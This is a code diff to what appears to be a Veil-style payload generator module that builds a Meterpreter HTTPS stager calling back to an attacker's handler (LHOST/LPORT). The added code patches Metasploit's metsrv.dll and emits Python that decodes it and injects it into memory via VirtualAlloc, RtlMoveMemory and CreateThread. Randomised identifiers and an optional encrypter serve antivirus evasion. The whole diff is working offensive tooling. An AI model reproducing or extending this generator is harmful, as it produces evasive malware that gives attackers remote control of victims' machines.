@@ -15,7 +15,8 @@ from modules.common import messages
 from modules.common import randomizer
 from modules.common import helpers
 from modules.common import crypters
-from config import veil
+
+import settings
 
 
 class Stager:
@@ -30,7 +31,8 @@ class Stager:
         
         # options we require user interaction for- format is {Option : [Value, Description]]}
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                "use_encrypter" : ["N", "Use an available encrypter"],
+                                "use_pyherion" : ["N", "Use the pyherion encrypter"],
+                                "inject_method" : ["void", "[virtual]alloc or [void]pointer"],
                                 "LHOST" : ["", "IP of the metasploit handler"],
                                 "LPORT" : ["", "Port of the metasploit handler"]}
         
@@ -44,7 +46,7 @@ class Stager:
     def genHTTPChecksum(self, value="CONN"):
         checkValue = 0
         if value == "INITW": checkValue = 92 # normal initiation
-        if value == "INITJ": checkValue = 88 # not sure...
+        if value == "INITJ": checkValue = 88
         else: checkValue = 98 # 'CONN', for existing/"orphaned" connections
         
         chk = string.ascii_letters + string.digits
@@ -57,7 +59,7 @@ class Stager:
                     
     def generate(self):
         
-        metsrvPath = veil.METASPLOIT_PATH + "/data/meterpreter/metsrv.dll"
+        metsrvPath = settings.METASPLOIT_PATH + "/data/meterpreter/metsrv.dll"
         
         f = open(metsrvPath, 'rb')
         meterpreterDll = f.read()
@@ -78,7 +80,7 @@ class Stager:
         userAgentString = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00"
         meterpreterDll = dllReplace(meterpreterDll,userAgentIndex,userAgentString)
 
-        # turn on SSL
+        # turn off SSL
         sslIndex = meterpreterDll.index("METERPRETER_TRANSPORT_SSL")
         sslString = "METERPRETER_TRANSPORT_HTTPS\x00"
         meterpreterDll = dllReplace(meterpreterDll,sslIndex,sslString)
@@ -104,26 +106,56 @@ class Stager:
         # actually build out the payload
         payloadCode = ""
         
-        # doing void * cast
-        payloadCode += "from ctypes import *\nimport base64,zlib\n"
+        # traditional void pointer injection
+        if self.required_options["inject_method"][0].lower() == "void":
 
-        randInflateFuncName = randomizer.randomString()
-        randb64stringName = randomizer.randomString()
-        randVarName = randomizer.randomString()
+            # doing void * cast
+            payloadCode += "from ctypes import *\nimport base64,zlib\n"
 
-        # deflate function
-        payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
-        payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
-        payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"
+            randInflateFuncName = randomizer.randomString()
+            randb64stringName = randomizer.randomString()
+            randVarName = randomizer.randomString()
 
-        randVarName = randomizer.randomString()
-        randFuncName = randomizer.randomString()
+            # deflate function
+            payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
+            payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
+            payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"
+
+            randVarName = randomizer.randomString()
+            randFuncName = randomizer.randomString()
+            
+            payloadCode += randVarName + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"
+            payloadCode += randFuncName + " = cast(" + randVarName + ", CFUNCTYPE(c_void_p))\n"
+            payloadCode += randFuncName+"()\n"
+
+        # VirtualAlloc() injection
+        else:
+
+            payloadCode += 'import ctypes,base64,zlib\n'
+
+            randInflateFuncName = randomizer.randomString()
+            randb64stringName = randomizer.randomString()
+            randVarName = randomizer.randomString()
+            randPtr = randomizer.randomString()
+            randBuf = randomizer.randomString()
+            randHt = randomizer.randomString()
+
+            # deflate function
+            payloadCode += "def "+randInflateFuncName+"("+randb64stringName+"):\n"
+            payloadCode += "\t" + randVarName + " = base64.b64decode( "+randb64stringName+" )\n"
+            payloadCode += "\treturn zlib.decompress( "+randVarName+" , -15)\n"
+
+            payloadCode += randVarName + " = bytearray(" + randInflateFuncName + "(\"" + compressedDll + "\"))\n"
+            payloadCode += randPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ randVarName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
+            payloadCode += randBuf + ' = (ctypes.c_char * len(' + randVarName + ')).from_buffer(' + randVarName + ')\n'
+            payloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + randPtr + '),' + randBuf + ',ctypes.c_int(len(' + randVarName + ')))\n'
+            payloadCode += randHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + randPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
+            payloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + randHt + '),ctypes.c_int(-1))\n'
+
+
+
         
-        payloadCode += randVarName + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"
-        payloadCode += randFuncName + " = cast(" + randVarName + ", CFUNCTYPE(c_void_p))\n"
-        payloadCode += randFuncName+"()\n"
-        
-        if self.required_options["use_encrypter"][0].lower() == "y":
+        if self.required_options["use_pyherion"][0].lower() == "y":
             payloadCode = crypters.pyherion(payloadCode)
 
         return payloadCode
